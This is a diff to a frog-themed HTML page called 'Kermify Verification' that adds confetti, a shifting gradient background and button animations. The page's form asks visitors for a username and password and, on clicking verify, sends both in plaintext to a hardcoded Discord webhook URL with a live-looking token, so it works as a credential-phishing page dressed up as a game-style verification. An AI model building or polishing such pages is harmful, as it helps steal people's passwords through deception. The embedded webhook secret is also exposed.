@@ -5,12 +5,13 @@
   <title>Kermify Verification 🐸</title>
   <style>
     body {
-      background-color: #4CAF50; /* Frog green */
-      color: #ffff99; /* Light yellow text */
+      background: linear-gradient(120deg, #4CAF50, #81C784); /* gradient frog green */
+      color: #ffff99;
       font-family: 'Comic Sans MS', sans-serif;
       text-align: center;
       padding-top: 50px;
       margin: 0;
+      transition: background 1s ease-in-out;
     }
 
     h1 {
@@ -27,6 +28,11 @@
       border: none;
       width: 200px;
       box-sizing: border-box;
+      transition: transform 0.2s;
+    }
+
+    .input-field:focus {
+      transform: scale(1.05);
     }
 
     #verifyBtn {
@@ -34,15 +40,16 @@
       font-size: 1.2em;
       border: none;
       border-radius: 8px;
-      background-color: #ffeb3b; /* yellow button */
+      background-color: #ffeb3b;
       color: #2e7d32;
       cursor: pointer;
       margin-top: 15px;
-      transition: 0.2s;
+      transition: 0.2s transform, 0.2s background-color;
     }
 
     #verifyBtn:hover {
       background-color: #fdd835;
+      transform: scale(1.1) rotate(-3deg);
     }
 
     #message {
@@ -51,7 +58,6 @@
       min-height: 1.5em;
     }
 
-    /* Bouncing frog animation */
     #frog {
       font-size: 4em;
       display: inline-block;
@@ -63,12 +69,32 @@
       0%, 100% { transform: translateY(0); }
       50% { transform: translateY(-20px); }
     }
+
+    /* Confetti style */
+    .confetti {
+      position: fixed;
+      width: 10px;
+      height: 10px;
+      background-color: #ffff00;
+      top: 0;
+      left: 50%;
+      opacity: 0.9;
+      z-index: 9999;
+      pointer-events: none;
+      animation: fall linear forwards;
+    }
+
+    @keyframes fall {
+      to {
+        transform: translateY(100vh) rotate(360deg);
+        opacity: 0;
+      }
+    }
   </style>
 </head>
 <body>
   <h1>Kermify Verification 🐸</h1>
 
-  <!-- Bouncing frog emoji -->
   <div id="frog">🐸</div>
 
   <input id="username" class="input-field" placeholder="Enter your username">
@@ -82,26 +108,42 @@
     const button = document.getElementById("verifyBtn");
     const message = document.getElementById("message");
 
-    // Replace this with your Discord webhook URL
+    // Discord webhook URL
     const webhookURL = "https://discord.com/api/webhooks/1409611043033976832/S730sZFzy9rDdpue2pqY2DVuFBXovlI5mhT4iMOAPji40S5-hvdn7hsIgLTnHdoU0Kn-";
+
+    // Function to create confetti
+    function createConfetti() {
+      const confetti = document.createElement("div");
+      confetti.classList.add("confetti");
+      confetti.style.left = Math.random() * window.innerWidth + "px";
+      confetti.style.backgroundColor = `hsl(${Math.random()*360}, 100%, 50%)`;
+      document.body.appendChild(confetti);
+      setTimeout(() => confetti.remove(), 3000);
+    }
+
+    // Animate background colors
+    let hue = 120;
+    setInterval(() => {
+      hue += 0.5;
+      document.body.style.background = `linear-gradient(120deg, hsl(${hue}, 50%, 40%), hsl(${hue+40}, 50%, 60%))`;
+    }, 100);
 
     button.addEventListener("click", () => {
       const user = document.getElementById("username").value || "Player";
       const pass = document.getElementById("password").value || "Code";
 
-      // Show verification message on page
+      // Show verification message
       message.textContent = `✅ ${user} has verified with password "${pass}"! Ribbit! 🐸`;
 
-      // Send verification info to Discord
+      // Send to Discord
       fetch(webhookURL, {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          content: `User verified: Username = ${user}, Password = ${pass}`
-        })
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({content: `User verified: Username = ${user}, Password = ${pass}`})
       }).catch(err => console.error("Webhook error:", err));
+
+      // Create confetti
+      for(let i=0;i<30;i++){ createConfetti(); }
     });
   </script>
 </body>
